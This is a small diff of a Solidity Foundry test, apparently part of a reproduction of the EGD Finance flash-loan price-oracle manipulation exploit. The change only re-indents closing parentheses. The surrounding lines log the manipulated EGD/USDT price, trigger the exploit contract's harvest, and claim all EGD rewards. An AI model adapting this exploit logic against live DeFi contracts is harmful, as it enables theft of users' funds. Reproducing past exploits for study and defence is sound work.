@@ -52,10 +52,10 @@ contract Attacker is Test {
         emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
         emit log_named_decimal_uint(
             "[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
-            );
+        );
         emit log_named_decimal_uint(
             "[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18
-            );
+        );
         console.log("Attacker manipulating price oracle of EGD Finance...");
 
         exploit.harvest();
@@ -113,7 +113,7 @@ contract Exploit is Test {
             console.log("Flashloan[2] received");
             emit log_named_decimal_uint(
                 "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
-                );
+            );
             // -----------------------------------------------------------------
             console.log("Claim all EGD Token reward from EGD Finance contract");
             IEGD_Finance(EGD_Finance).claimAllReward();
